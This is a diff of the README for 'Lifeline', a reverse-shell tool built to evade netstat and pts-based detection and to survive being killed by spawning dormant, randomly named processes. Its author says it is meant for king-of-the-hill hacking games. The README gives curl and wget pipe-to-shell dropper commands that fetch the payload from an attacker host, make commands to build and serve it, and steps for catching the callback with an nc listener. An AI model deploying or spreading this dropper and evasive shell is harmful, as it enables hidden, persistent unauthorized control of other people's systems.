@@ -2,7 +2,7 @@
 
 Lifeline is a reverse shell that's designed to be hard to detect and hard to kill. It does this by spawning many dormant processes with randomized names that can take over when a shell is killed.
 
-tl;dr:
+## tl;dr:
 ![](.github/meme.png)
 
 It is like the cockroach of reverse shells; Not particularly nice to look at, but it will survive almost anything.
@@ -13,17 +13,18 @@ It is like the cockroach of reverse shells; Not particularly nice to look at, bu
  * Easily spawn many reverse shells as background processes
  * Only one process will connect back to your listener, leaving all other processes undetected by `netstat`
  * The default reverse shell does not use a `pts`, making it harder to detect.
+ * Compatible with [pwncat](https://github.com/calebstewart/pwncat)
 ### Cons
  * The reverse shell is extremely bare bones and not super user-friendly.
  * The reverse shell is compiled, making it harder to deploy if your target has a different architecture.
 
 
-## Depenencies
+## Dependencies
 * GCC
 * make
 * python3 (used as a basic webserver)
 
-## Usage (basic)
+## Usage
 To compile and serve a lifeline binary, use the following command:
 ```
 make serve HOST=x.x.x.x
@@ -43,6 +44,10 @@ This command will build the binary, create dropper scripts and hosts them using 
  Temp file:                                              
   curl http://10.0.0.12:8000/dropper.sh | sh         
   wget -O - http://10.0.0.12:8000/dropper.sh | sh    
+
+ Raw download:
+  curl http://10.0.0.12:8000/lineline > lifeline         
+  wget http://10.0.0.12:8000/lifeline
 =========================================================
 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -51,13 +56,13 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 After which you can open a new terminal with a `nc` listener on port `1337` and wait for the callback.  
 From the `nc` listener, you can execute commands directly or drop into an `sh` process using the "!shell" command.
 
-## Usage (advanced)
-To compile a lifeline binary, run the make command in the projects root and supply the IP address of your listener as follows:
-```
-make HOST=x.x.x.x PORT=xxxx NUM=x
-```
-* `PORT`: Listener port, defaults to `1337`
-* `NUM`: Number of processes started by a dropper, defaults to `10`
+## Make flags:
+|Flag      |                                                            |
+|----------|------------------------------------------------------------|
+|`HOST`    | Listener IP address.                                       |
+|`PORT`    | Listener port, defaults to `1337`.                         |
+|`NUM`     | Number of processes started by a dropper, defaults to `10`.|
+|`PY_PORT` | Port used for Python http server, defaults to 8000.        |
 
 
 ## Practicalities
@@ -68,6 +73,6 @@ make HOST=x.x.x.x PORT=xxxx NUM=x
 ### Q; Does this provide an persistance against reboots?
 No, I created this program mostly for "KOTH"-like hacking games, where reboots aren't really an issue. 
 ### Q; Why is the shell so bad?
-The default "shell" is actually just a bunch of `popen` calls. You can used "!shell" to drop into a normal reverse shell which you can stabilize with python or pwncat.  
+The default "shell" is actually just a bunch of `popen` calls. You can used "!shell" to drop into a normal reverse shell which you can stabilize with Python. You can also use [pwncat](https://github.com/calebstewart/pwncat)'s listener if you want a fancy shell.
 
 The rationale behind this is that I want to keep control over the process to facilitate reconnecting, which is not possible once you set up a normal reverse shell with `execve`.
